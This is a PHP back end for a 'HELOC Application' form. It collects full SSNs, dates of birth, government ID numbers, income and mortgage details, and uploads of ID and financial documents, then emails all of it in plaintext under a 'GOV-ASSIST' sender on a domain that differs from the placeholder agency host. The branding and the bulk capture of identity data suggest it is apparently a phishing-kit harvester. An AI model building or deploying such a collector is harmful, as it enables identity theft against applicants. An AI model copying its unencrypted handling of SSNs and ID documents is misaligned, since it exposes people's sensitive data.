<?php
/**
 * HELOC Application Processor
 * Sends full application details, including full SSN and file uploads, via SMTP (PHPMailer-compatible).
 */
session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require_once __DIR__ . '/mailer-lite.php';

$smtpHost = 'smtp.your-agency.gov';
$smtpPort = 587;
$smtpUser = 'smtp-user';
$smtpPass = 'smtp-password';
$fromEmail = 'no-reply@gov-assist-portal.com';
$toEmail   = 'lending@your-agency-portal.com';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (!isset($_POST['csrf_token'], $_SESSION['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("Security error: Invalid submission.");
    }

    $clean = function ($key) {
        return isset($_POST[$key]) ? trim(filter_var($_POST[$key], FILTER_SANITIZE_SPECIAL_CHARS)) : '';
    };

    $allowedExt = ['pdf', 'jpg', 'jpeg', 'png'];
    $maxSize = 5 * 1024 * 1024;

    $validateUpload = function ($file, $required = true, $label = '') use ($allowedExt, $maxSize) {
        if (!isset($file) || $file['error'] === UPLOAD_ERR_NO_FILE) {
            if ($required) {
                throw new Exception("Missing required upload: {$label}");
            }
            return null;
        }
        if ($file['error'] !== UPLOAD_ERR_OK) {
            throw new Exception("Upload error for {$label}");
        }
        if ($file['size'] > $maxSize) {
            throw new Exception("{$label} exceeds size limit.");
        }
        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        if (!in_array($ext, $allowedExt, true)) {
            throw new Exception("Invalid file type for {$label}");
        }
        $finfo = new finfo(FILEINFO_MIME_TYPE);
        $mime = $finfo->file($file['tmp_name']);
        $allowedMime = ['application/pdf', 'image/jpeg', 'image/png'];
        if (!in_array($mime, $allowedMime, true)) {
            throw new Exception("Invalid MIME type for {$label}");
        }
        return $file;
    };

    $name               = $clean('full_name');
    $dob                = $clean('date_of_birth');
    $phone              = $clean('phone');
    $email              = $clean('email');
    $ssn                = $clean('ssn');
    $gov_id             = $clean('gov_id_number');
    $issuing_state      = $clean('issuing_state');
    $id_expiration      = $clean('id_expiration');
    $employment_status  = $clean('employment_status');
    $employer_name      = $clean('employer_name');
    $job_title          = $clean('job_title');
    $employment_length  = $clean('employment_length');
    $gross_income       = $clean('gross_monthly_income');
    $other_income       = $clean('other_income_sources');
    $property_address   = $clean('property_address');
    $property_type      = $clean('property_type');
    $primary_residence  = isset($_POST['primary_residence']) ? 'Yes' : 'No';
    $year_purchased     = $clean('year_purchased');
    $purchase_price     = $clean('purchase_price');
    $current_value      = $clean('current_value');
    $mortgage_balance   = $clean('mortgage_balance');
    $lender_name        = $clean('lender_name');
    $credit_score       = $clean('credit_score_range');
    $monthly_payment    = $clean('monthly_mortgage_payment');
    $other_debts        = $clean('other_monthly_debts');
    $bankruptcy_history = isset($_POST['bankruptcy_history']) ? 'Yes' : 'No';
    $foreclosure_history= isset($_POST['foreclosure_history']) ? 'Yes' : 'No';
    $requested_line     = $clean('requested_credit_line');
    $use_of_funds       = $clean('use_of_funds');
    $draw_period        = $clean('preferred_draw_period');
    $repayment_term     = $clean('preferred_repayment_term');
    $credit_pull_auth   = isset($_POST['credit_pull_auth']) ? 'Yes' : 'No';
    $certification      = isset($_POST['certification']) ? 'Yes' : 'No';
    $terms_agreement    = isset($_POST['terms_agreement']) ? 'Yes' : 'No';
    $digital_signature  = $clean('digital_signature');
    $signature_date     = $clean('signature_date');

    if (empty($name) || empty($email) || empty($ssn)) {
        die("Security error: Missing required fields.");
    }

    $ltv = 0;
    if ($current_value !== '' && $current_value > 0) {
        $total_debt = (float)$mortgage_balance + (float)$requested_line;
        $ltv = ($total_debt / (float)$current_value) * 100;
    }

    $fields = [
        "FULL NAME" => $name,
        "DATE OF BIRTH" => $dob,
        "PHONE" => $phone,
        "EMAIL" => $email,
        "FULL SSN" => $ssn,
        "GOVERNMENT ID NUMBER" => $gov_id,
        "ISSUING STATE" => $issuing_state,
        "ID EXPIRATION DATE" => $id_expiration,
        "EMPLOYMENT STATUS" => $employment_status,
        "EMPLOYER NAME" => $employer_name,
        "JOB TITLE" => $job_title,
        "LENGTH OF EMPLOYMENT" => $employment_length,
        "GROSS MONTHLY INCOME" => $gross_income,
        "OTHER INCOME SOURCES" => $other_income,
        "PROPERTY ADDRESS" => $property_address,
        "PROPERTY TYPE" => $property_type,
        "PRIMARY RESIDENCE" => $primary_residence,
        "YEAR PURCHASED" => $year_purchased,
        "PURCHASE PRICE" => $purchase_price,
        "ESTIMATED CURRENT VALUE" => $current_value,
        "OUTSTANDING MORTGAGE BALANCE" => $mortgage_balance,
        "CURRENT MORTGAGE LENDER" => $lender_name,
        "ESTIMATED CREDIT SCORE RANGE" => $credit_score,
        "MONTHLY MORTGAGE PAYMENT" => $monthly_payment,
        "OTHER MONTHLY DEBTS" => $other_debts,
        "BANKRUPTCY HISTORY" => $bankruptcy_history,
        "FORECLOSURE HISTORY" => $foreclosure_history,
        "REQUESTED CREDIT LINE AMOUNT" => $requested_line,
        "INTENDED USE OF FUNDS" => $use_of_funds,
        "PREFERRED DRAW PERIOD" => $draw_period,
        "PREFERRED REPAYMENT TERM" => $repayment_term,
        "CALCULATED CLTV (%)" => round($ltv, 2),
        "CREDIT PULL AUTHORIZATION" => $credit_pull_auth,
        "CERTIFICATION" => $certification,
        "AGREEMENT TO TERMS" => $terms_agreement,
        "DIGITAL SIGNATURE" => $digital_signature,
        "SIGNATURE DATE" => $signature_date,
    ];

    $message = "Official HELOC Application\n";
    $message .= "====================================\n\n";
    foreach ($fields as $label => $value) {
        $message .= "{$label}: {$value}\n";
    }
    $message .= "\nSubmission Timestamp: " . date("Y-m-d H:i:s") . "\n";

    try {
        $attachments = [];
        $attachments[] = $validateUpload($_FILES['proof_identity'] ?? null, true, 'Proof of Identity');
        $attachments[] = $validateUpload($_FILES['proof_income'] ?? null, true, 'Proof of Income');
        $attachments[] = $validateUpload($_FILES['mortgage_statement'] ?? null, true, 'Mortgage Statement');
        $attachments[] = $validateUpload($_FILES['homeowners_insurance'] ?? null, true, 'Homeowners Insurance');
        $attachments[] = $validateUpload($_FILES['property_tax_statement'] ?? null, true, 'Property Tax Statement');

        $mail = new PHPMailer(true);
        $mail->isSMTP();
        $mail->Host = $smtpHost;
        $mail->Port = $smtpPort;
        $mail->Username = $smtpUser;
        $mail->Password = $smtpPass;
        $mail->SMTPAuth = true;
        $mail->SMTPSecure = 'tls';
        $mail->setFrom($fromEmail, 'GOV-ASSIST HELOC');
        $mail->addAddress($toEmail);
        $mail->addReplyTo($email);
        $mail->Subject = "NEW HELOC APPLICATION: {$name}";
        $mail->Body = $message;
        $mail->AltBody = strip_tags($message);
        $mail->isHTML(false);

        foreach ($attachments as $file) {
            if (!$file) { continue; }
            $mail->addAttachment($file['tmp_name'], $file['name']);
        }

        if ($mail->send()) {
            header("Location: ../success.html");
            exit();
        }

        throw new Exception("Mailer Error: " . $mail->ErrorInfo);
    } catch (Exception $e) {
        echo "An error occurred. Please try again later.";
        echo "<pre>" . htmlspecialchars($e->getMessage()) . "</pre>";
    }
} else {
    header("Location: ../index.html");
    exit();
}
